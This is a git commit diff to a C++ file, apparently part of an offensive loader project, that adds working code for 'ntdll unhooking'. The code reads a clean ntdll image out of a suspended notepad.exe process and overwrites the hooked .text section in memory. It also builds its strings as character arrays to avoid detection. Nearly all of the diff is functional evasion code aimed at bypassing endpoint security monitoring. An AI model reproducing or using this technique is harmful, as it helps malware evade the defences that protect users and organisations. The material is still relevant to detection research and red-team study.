51679ef9c00ce42da722c2433471f405fae006bb
most3r <763026400@qq.com>
2023-09-22 11:20:59 +0800

    memoryencrypt add unhook ntdll

--- moo1_memory_encrypt/moo1.cpp
+++ moo1_memory_encrypt/moo1.cpp
@@ -537,6 +537,93 @@ static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
     return -1;
 }
 
+LPVOID getNtdll() {
+
+    LPVOID pntdll = NULL;
+
+    //Create our suspended process
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+    if (!pi.hProcess)
+    {
+        //printf("[-] Error creating process\r\n");
+        return NULL;
+    }
+
+    //Get base address of NTDLL
+    HANDLE process = GetCurrentProcess();
+    MODULEINFO mi;
+    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
+    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+
+
+    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
+    SIZE_T dwRead;
+    BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
+    if (!bSuccess) {
+        //printf("Failed in reading ntdll (%u)\n", GetLastError());
+        return NULL;
+    }
+
+
+    TerminateProcess(pi.hProcess, 0);
+    return pntdll;
+}
+
+
+
+// 脱钩ntdll
+BOOL Unhook(LPVOID cleanNtdll) {
+
+    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };
+
+    HANDLE hNtdll = GetModuleHandleA(nt);
+    DWORD oldprotect = 0;
+    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
+    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);
+    int i;
+
+
+    // find .text section
+    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));
+
+        char txt[] = { '.','t','e','x','t', 0 };
+
+        if (!strcmp((char*)sectionHdr->Name, txt)) {
+
+            // prepare ntdll.dll memory region for write permissions.
+            BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
+                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
+            if (!ProtectStatus1) {
+                //printf("Failed to change the protection (%u)\n", GetLastError());
+                return FALSE;
+            }
+
+            // copy .text section from the mapped ntdll to the hooked one
+            memcpy((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);
+
+
+            // restore original protection settings of ntdll
+            BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
+                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
+            if (!ProtectStatus2) {
+                //printf("Failed to change the protection back (%u)\n", GetLastError());
+                return FALSE;
+            }
+
+        }
+    }
+
+    return TRUE;
+
+}
+
+
 
 
 void HookSleep() {
